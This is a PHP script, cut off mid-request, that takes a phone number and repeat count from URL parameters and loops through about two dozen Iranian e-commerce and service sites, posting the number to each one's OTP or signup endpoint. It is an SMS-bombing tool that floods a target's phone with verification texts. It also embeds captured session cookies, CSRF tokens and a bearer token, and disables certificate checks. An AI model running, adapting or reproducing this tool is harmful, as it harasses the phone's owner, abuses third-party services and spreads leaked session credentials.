<?php
//Strings
$Phone = htmlspecialchars($_GET['phone']);
$count = htmlspecialchars($_GET['count']);
$count_final = $count +1;
$full_phone = "$Phone";
//============================================================================//
//#<<<<<<<Developer>>>>>>>#//
//#https://github.com/Antrax-QG
//#telegram: @navidshams 
//============================================================================//
//Random Function
function random($length, $type) {
if($type == "1"){
return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "2"){
return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}
if($type == "3"){
return substr(str_shuffle(str_repeat($x='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "4"){
return substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}
if($type == "5"){
return substr(str_shuffle(str_repeat($x='ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "6"){
return substr(str_shuffle(str_repeat($x='0123456789', ceil($length/strlen($x)) )),1,$length);
}
}
//============================================================================//
//Random Strings
$i = 1;
while($i<$count_final){
$random_ab = random("24", "1");
$PHPSESSID = random("32", "2");
$Sheypoor = random("32", "2");
$fname = random("5", "4");
$lname = random("8", "4");
$password = random("12", "1");
$email_rand = random("7", "2");
$email = "$email_rand@gmail.com";
$AccountOAuthTempID = random("23", "1");
$guid = "".random("8", "3")."-".random("4", "3")."-".random("4", "3")."-".random("4", "3")."-".random("12", "3")."";
//----------------------------------------------------------------------------//
$Sender = curl_init();
$Sender_Url = "https://rojashop.com/api/auth/sendOtp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: rojashop.com",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
"Accept: */*",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://rojashop.com/",
"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
"X-CSRF-TOKEN: XaSiyCl5mePU2t9wVxKysQRl3nQAdE7P8TTzNXnM",
"X-Requested-With: XMLHttpRequest",
"Content-Length: 18",
"Origin: https://rojashop.com",
"Connection: keep-alive",
"Cookie: XSRF-TOKEN=eyJpdiI6IjY5Y3JvL2dWM0M5TFNvdmNIVnVjaUE9PSIsInZhbHVlIjoiSC85ZXZoMDhqZU5FMnpvdmx3WDJsOFVxRE1pRjdXc1pGRTlvSDRRUWg3c2FoOHJYb3Y0S3ZaYnlvaEFITndmd1NlcEdTV2tSM3ZpU3pFckdoTm44NUFvK1VLMnJpa2lQTjhqV2dhVnh6TmU3TmpOVUVNTGh1dis0bmJzZjZ3UCsiLCJtYWMiOiJkYjQzZDM2ZWY2NWJlYmEyYTMzZDk0NjZhMDU4NTZmYWM0M2Q4M2ZmOTZhNTRkNzIwNTY2MGM3MTJhMTI4YThhIn0%3D; rojashop_session=eyJpdiI6IkQ1YSsrZHdYdHdZSGFEMG4weW1sUWc9PSIsInZhbHVlIjoibEtxbjBaYzJ5ZDZ4RldVM202VXNMYWJBWVJVaWltcFRUK1dJam9UelMzUXVlUkZUdTdJWjJPRG5LRWR6OUU5YnRqa3dGenNjR1lOVVB2cjdKZkxHY1oxeHNIVWRaanRZRENuTUMxaSsyZjZZL3RKV012NXQ5RXFEMHlRQy9IUmEiLCJtYWMiOiJhZGVhY2MyMDQ4MjNlMTVlOWFiNTJhNGVkYWYyMzFmNTI2NzQyMDAwNjRmZTRlODYzNTE0OTQyOWYwZmRjMzBhIn0%3D; user_uuid=eyJpdiI6IjdwaW56STJERllaMVB4WEdQOGhvQUE9PSIsInZhbHVlIjoickFkQ2dnUG5PZEREZEQrNmlmd2xMTjVyNWx2R3BwZmE3enhrVmJIRWRmak1wcjk1WWZPZ242TjFVMSszNEk5Yyt6bGF5RytQV3J0N3ZVQlZRTUxBWmx2YVRxOXl2WjFKYkgwSGJmRjBObDg9IiwibWFjIjoiYjI1NzRjMjQ4NjNhMGQ3ZTg0NDE4MTkyODM4MzgyNTIwYWFmZTdkNzI4MjlhMzVjZjM0NThmNDExYWUxNDUwYyJ9; _pk_id.1.15de=3493a6becc16914c.1608912987.1.1608912987.1608912987.; _pk_ref.1.15de=%5B%22%22%2C%22%22%2C1608912987%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.1.15de=1; pushNotification-shownCount-2045=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=c948d37a-9cca-88d8-ef88-4123055b9779; analytics_token=ffd5a657-566e-cea4-7838-0520d89a0598; yektanet_session_last_activity=12/25/2020; _yngt_iframe=1; tlc=true; _ga=GA1.2.1511430991.1608912989; _gid=GA1.2.1890368142.1608912989; _gat_gtag_UA_104552748_1=1; _yngt=60e80e19-93148-8c9a1-1c764-42b43a41577dd; _gat_UA-104552748-1=1; _hjid=5f1dc07a-7d95-459c-afca-1a89bb9f943f; _hjFirstSeen=1; _hjAbsoluteSessionInProgress=1; MEDIAAD_USER_ID=07149cf0-3dc3-46c9-b1bf-822684e18c9c; pushNotification-notWantPopUp-2045=true",
"TE: Trailers",
"Pragma: no-cache",
"Cache-Control: no-cache"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobile='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://www.khanoumi.com/accounts/sendotp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: www.khanoumi.com",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://www.khanoumi.com/accounts/authentication?redirectUrl=/",
"Content-Type: application/x-www-form-urlencoded",
"Content-Length: 34",
"Origin: https://www.khanoumi.com",
"Connection: keep-alive",
"Cookie: _ga=GA1.2.740353207.1608912982; _gid=GA1.2.1845350466.1608912982; pushNotification-shownCount-1309=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=5564f48e-ce7b-5064-9d73-7b3a5491378c; analytics_token=0d19f577-1fe6-83f5-40b1-708cb286cea2; yektanet_session_last_activity=12/25/2020; _yngt_iframe=1; _yngt=60e80e19-93148-8c9a1-1c764-42b43a41577dd; mailerlite:webform:shown:3235258=1608912987222; tlc=true; ASP.NET_SessionId=kequigaszlxokg5sji3tyicm",
"Upgrade-Insecure-Requests: 1",
"TE: Trailers",
"Pragma: no-cache",
"Cache-Control: no-cache"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobile='.$Phone.'&redirectUrl=%2F');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://teamapp.app/api/users/request_otp/";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: teamapp.app",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
"Accept: */*",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Content-Type: application/json",
"Content-Length: 73",
"X-User-Agent: PWA",
"X-Device-Id: 728828",
"X-device-uuid: 82012b09-676f-420e-9eb3-afc3e4c0a59e",
"Origin: https://teamapp.app",
"Connection: keep-alive",
"Cookie: order_utm={%22http_referer%22:%22https://www.google.com/%22}; _ga=GA1.2.470654992.1608911831; _gid=GA1.2.1012831553.1608911831; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=4b3dc24c-dcc3-9beb-67a2-a26fd721a06e; analytics_token=01b6f034-6383-1cb4-52ba-a83da5ebfa22; yektanet_session_last_activity=12/25/2020; _yngt_iframe=1; _yngt=60e80e19-93148-8c9a1-1c764-42b43a41577dd; _hp2_ses_props.23937446=%7B%22ts%22%3A1608911888951%2C%22d%22%3A%22teamapp.app%22%2C%22h%22%3A%22%2Flogin%22%2C%22q%22%3A%22%3Furl%3D%252F%26REQUEST_OTP%3Don%22%7D; _hp2_id.23937446=%7B%22userId%22%3A%225617626607093781%22%2C%22pageviewId%22%3A%225071673310463758%22%2C%22sessionId%22%3A%225343688397577823%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _gat_UA-133868894-1=1"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"mobile":"'.$Phone.'","utm":{"http_referer":"https://www.google.com/"}}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://ghesta.ir/api/otp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: ghesta.ir",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
"Accept: application/json, text/plain, */*",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://ghesta.ir/register",
"Content-Type: application/json",
"Access-Control-Allow-Origin: *",
"Access-Control-Allow-Methods: GET, POST",
"Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token, Authorization",
"Cache-Control: no-cache, no-store",
"X-CSRF-TOKEN: lSKnu1MRgjWjGMRBHsP47uI4YKC9VvWBg9Oyywdv",
"Authorization: *_* Mr TOKEN is Death",
"X-XSRF-TOKEN: eyJpdiI6IjhkWTdTZnFRbUR0Y1FxNDlmNFFIN1E9PSIsInZhbHVlIjoicHZIOVR6TjZHbFRhendGeHpZN0hUOFkxQVNHbFlaZ2RiVDMzdW0wSE1IcmxLWkpQRGVIcGJ0ZnJCK1Q2V0Jxc1FicWx4UFN2czlzRWk2RURWTEFaVzRBVTk0dEl1QXhmTmo2bHhYSEFBSEI3eXFqUzJ6UXpsYkZUc0crRkdOdFYiLCJtYWMiOiJiZTk5ODRjNGY5ZDc3NTE2Y2NhNWM3OWYzMmVlMjMwZjJlZjYzOTQyYzNmYjU2MDUyMDVjMGFlNjE5YmNmNzNiIn0=",
"Content-Length: 44",
"Origin: https://ghesta.ir",
"Connection: keep-alive",
"Cookie: XSRF-TOKEN=eyJpdiI6IjhkWTdTZnFRbUR0Y1FxNDlmNFFIN1E9PSIsInZhbHVlIjoicHZIOVR6TjZHbFRhendGeHpZN0hUOFkxQVNHbFlaZ2RiVDMzdW0wSE1IcmxLWkpQRGVIcGJ0ZnJCK1Q2V0Jxc1FicWx4UFN2czlzRWk2RURWTEFaVzRBVTk0dEl1QXhmTmo2bHhYSEFBSEI3eXFqUzJ6UXpsYkZUc0crRkdOdFYiLCJtYWMiOiJiZTk5ODRjNGY5ZDc3NTE2Y2NhNWM3OWYzMmVlMjMwZjJlZjYzOTQyYzNmYjU2MDUyMDVjMGFlNjE5YmNmNzNiIn0%3D; ghesta_session=eyJpdiI6IjRQMWhCRitvOWFjcEM2bktvUmNnbXc9PSIsInZhbHVlIjoiL3ZyUWI0Zk41ZGRrUElGcTZxV3h4blV3YkFjaXpGaGF3UUNPVVlmd3NwRGxURFlMbSsxeE5YMWYzSGRTeno1Tm5UU0ZlZThxN2hoeCtNQ2R0MGRWcVJKLzdlTnY3QXFaa09ubENBZkpzLzZ1QXkyNSt2dzlkc3hNaHVnL2hRak0iLCJtYWMiOiI4ODQxY2U5NDE5YjQ0NmZlNTg1Y2VhMzY1YmU5OTA5MDMwYTQ2NjliOThmODg0ZDAyNjg4YTM4ZWUwYWJiNjFkIn0%3D; _gcl_au=1.1.1062071153.1608912977; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=d10f6727-af5a-3064-244d-6ca832c547d7; analytics_token=2be9ff88-0e97-4bfb-a15d-e36a8945d3da; yektanet_session_last_activity=12/25/2020; _yngt_iframe=1; _ga=GA1.2.830863579.1608912980; _gid=GA1.2.1754013481.1608912980; _yngt=60e80e19-93148-8c9a1-1c764-42b43a41577dd; _gaexp=GAX1.2._ILyyJuKR2u8fn-W6g2Hwg.18704.1",
"TE: Trailers",
"Pragma: no-cache"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"username":"'.$Phone.'","type":"register"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://mactoos.com/includes/ajax/login.php";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: mactoos.com",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
"Accept: */*",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://mactoos.com/",
"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
"X-Requested-With: XMLHttpRequest",
"Content-Length: 26",
"Origin: https://mactoos.com",
"Connection: keep-alive",
"Cookie: PHPSESSID=uelvtu1oqq3nrvdkocqf80g4q0; _ga=GA1.2.1122510866.1608912154; _gid=GA1.2.2066260345.1608912154; ssupp.vid=viAwhKp4mAmyj; ssupp.visits=1",
"TE: Trailers",
"Pragma: no-cache",
"Cache-Control: no-cache"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobile='.$Phone.'&rule=on');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://izadimarket.com/api/v1/customers/signup/mobile?errorHandler=true";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: izadimarket.com",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
"Accept: application/json",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://izadimarket.com/shop/",
"Content-Type: application/json",
"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOiIyMDIwLTEyLTI2VDE1OjI0OjUzLjc4MzY0NTQ1KzAzOjMwIiwia2V5IjoiZGE3MWFmMDE5YzEyY2NlOGVlMmJlMGQyODgxMTlkOGJjYmE3YjNmOGY2ZDk3MWUwMjA2ZDZlYjljNjE0MGEzNCIsInVuYW1lIjoiIn0.hfjc7OhKNaqFHRmIH8Rub9L3M_HaJ3ELxYRxC_cIFJg",
"Content-Length: 24",
"Origin: https://izadimarket.com",
"Connection: keep-alive",
"Pragma: no-cache",
"Cache-Control: no-cache"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"mobile":"'.$Phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://pinket.com/api/cu/v1/phone_verification";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json;charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phoneNumber":"'.$Phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://www.modiseh.com/profile/RegisterMobileNo";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobileNo='.$Phone.'&customerId=');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://tagmond.com/phone_number";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'utf8=%E2%9C%93&phone_number='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://tap33.me/api/v2/user";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json; charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"credential":{"phoneNumber":"'.$Phone.'","role":"PASSENGER"}
}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://ws.alibaba.ir/api/v3/account/mobile/otp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json;charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phoneNumber":"'.$Phone.'"}=');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://api.famiran.com/api/user/signup";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"Mobile":"'.$Phone.'","SchoolId":-1}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://api.bitel.rest/api/v1/auth/otp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phone":"'.$Phone. '","type":1}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://web.emtiyaz.app/json/login";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'send=1&cellphone='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://www.shahrvand.ir/ajax.php?user_do=register_code";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobile='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://bama.ir/signIn-resendotp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'cellNumber='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "api.divar.ir/v5/auth/authenticate";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/grpc'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phone":"'.$Phone.'"}:');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://sandbox.sbm24.net/api/v1/register/confirm";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'username='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "api2.anten.ir/users/";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json;charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phone":"'.$Phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "http://www.mopon.ir/%D8%A7%D8%B1%D8%B3%D8%A7%D9%84-%DA%A9%D8%AF-%D9%81%D8%B9%D8%A7%D9%84-%D8%B3%D8%A7%D8%B2%DB%8C?phone=$Phone";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'X-Requested-With: XMLHttpRequest',
'Accept-Language: en-US,en;q=0.9',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://www.otaghak.com/odata/Otaghak/Users/SendVerificationCode";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"userName":"'.$Phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=$Phone&dummy=1607267988351";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: text/plain;charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://technokade.com/login?back=my-account";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
));
curl_setopt($Sender, CURLOPT_POST, true);
